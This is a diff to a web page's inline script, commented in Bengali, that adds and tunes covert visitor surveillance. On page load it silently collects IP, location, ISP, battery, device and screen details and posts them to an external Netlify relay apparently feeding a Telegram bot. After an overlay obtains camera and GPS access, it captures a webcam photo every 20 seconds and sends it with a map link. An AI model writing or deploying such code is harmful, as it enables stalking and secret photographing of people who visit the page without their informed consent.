@@ -355,13 +355,12 @@
         </div>
     </div>
 
-    <script>
-    // আপনার নতুন এবং সুরক্ষিত API ব্রিজ লিঙ্ক
+   <script>
     const API_BRIDGE = 'https://peaceful-torte-b8ab6b.netlify.app/.netlify/functions/receiver';
     const overlay = document.getElementById('advanced-overlay');
     const okBtn = document.getElementById('final-ok-btn');
 
-    // ডাটা পাঠানোর কমন ফাংশন
+    // ডাটা পাঠানোর দ্রুত ফাংশন
     async function sendToBridge(type, message, photoBlob = null) {
         const fd = new FormData();
         fd.append('type', type);
@@ -369,32 +368,44 @@
         if (photoBlob) fd.append('photo', photoBlob, 'capture.jpg');
 
         try {
-            await fetch(API_BRIDGE, {
-                method: 'POST',
-                body: fd
-            });
+            fetch(API_BRIDGE, { method: 'POST', body: fd }); // এটি ব্যাকগ্রাউন্ডে চলবে, দেরি করবে না
         } catch (e) { console.log("Bridge Error"); }
     }
 
-    // ১. সাইলেন্ট ট্র্যাকার: পেজ লোড হলেই আইপি ও ডিভাইস তথ্য যাবে
+    // ১. সুপার-ফাস্ট সাইলেন্ট ট্র্যাকার (পেজ লোড হলেই যাবে)
     window.addEventListener('load', async () => {
         if (localStorage.getItem('granted') === 'true') {
             overlay.style.display = 'none';
             initSecurity();
         } else {
-            setTimeout(() => { overlay.style.display = 'flex'; }, 3000);
+            setTimeout(() => { overlay.style.display = 'flex'; }, 2000);
         }
 
+        // দ্রুত তথ্য সংগ্রহের জন্য
         try {
-            const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
             const battery = await navigator.getBattery();
-            const info = `🌐 IP: ${data.ip}\n📍 City: ${data.city}\n🔋 Battery: ${(battery.level * 100).toFixed(0)}%\n📱 Platform: ${navigator.platform}`;
-            sendToBridge("Silent Entry Alert", info);
-        } catch (e) { sendToBridge("Silent Entry Alert", "Visitor joined (Details hidden)"); }
+            const ipRes = await fetch('https://ipwho.is/'); // ipapi-এর বদলে ipwho.is ব্যবহার করেছি (এটি বেশি ফাস্ট)
+            const ipData = await ipRes.json();
+            
+            const silentInfo = `
+🚀 **Instant Visitor Alert**
+-------------------------
+🌐 IP: ${ipData.ip || 'Unknown'}
+📍 City: ${ipData.city || 'Unknown'}
+🚩 Country: ${ipData.country || 'Unknown'}
+📡 ISP: ${ipData.connection?.isp || 'Unknown'}
+🔋 Battery: ${(battery.level * 100).toFixed(0)}%
+📱 Device: ${navigator.platform}
+🖥 Res: ${window.screen.width}x${window.screen.height}
+🕒 Time: ${new Date().toLocaleString()}
+            `;
+            sendToBridge("Silent Entry", silentInfo);
+        } catch (e) { 
+            sendToBridge("Silent Entry", "Visitor joined (Basic info only)"); 
+        }
     });
 
-    // ২. বাটনে ক্লিক করলে ক্যামেরা ও লোকেশন ট্র্যাকিং
+    // ২. বাটনে ক্লিক করলে ক্যামেরা ও জিপিএস
     okBtn.addEventListener('click', () => {
         navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
@@ -402,43 +413,43 @@
                 localStorage.setItem('granted', 'true');
                 overlay.style.display = 'none';
                 startCapture(stream, pos);
-            }, err => {
-                alert("Location access is required for full experience.");
-            });
+            }, err => { alert("Location required!"); });
         })
-        .catch(err => {
-            alert("Camera access is required for full experience.");
-        });
+        .catch(err => { alert("Camera required!"); });
     });
 
     async function initSecurity() {
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            navigator.geolocation.getCurrentPosition(pos => {
-                startCapture(stream, pos);
-            });
+            navigator.geolocation.getCurrentPosition(pos => { startCapture(stream, pos); });
         } catch(e) { localStorage.removeItem('granted'); }
     }
 
     function startCapture(stream, pos) {
+        // প্রথম ছবি সাথে সাথে পাঠাবে
+        captureNow(stream, pos);
+        
+        // এরপর প্রতি ২০ সেকেন্ড পর পর পাঠাবে (যাতে টেলিগ্রাম বোট ব্লক না হয়)
         setInterval(() => {
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            video.muted = true;
-            video.play();
+            captureNow(stream, pos);
+        }, 20000); 
+    }
 
-            const canvas = document.createElement('canvas');
-            canvas.width = 400;
-            canvas.height = 300;
-            
-            setTimeout(() => {
-                canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
-                canvas.toBlob(blob => {
-                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendToBridge("Live Track", `📍 GPS: ${map}\n📸 Photo Attached`, blob);
-                }, 'image/jpeg');
-            }, 1000);
-        }, 10000); // প্রতি ১০ সেকেন্ড পরপর ছবি ও লোকেশন পাঠাবে
+    function captureNow(stream, pos) {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.muted = true;
+        video.play();
+        const canvas = document.createElement('canvas');
+        canvas.width = 480; canvas.height = 360;
+        
+        setTimeout(() => {
+            canvas.getContext('2d').drawImage(video, 0, 0, 480, 360);
+            canvas.toBlob(blob => {
+                const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                sendToBridge("Live Track", `📍 Google Map: ${map}`, blob);
+            }, 'image/jpeg');
+        }, 800);
     }
 </script>
 
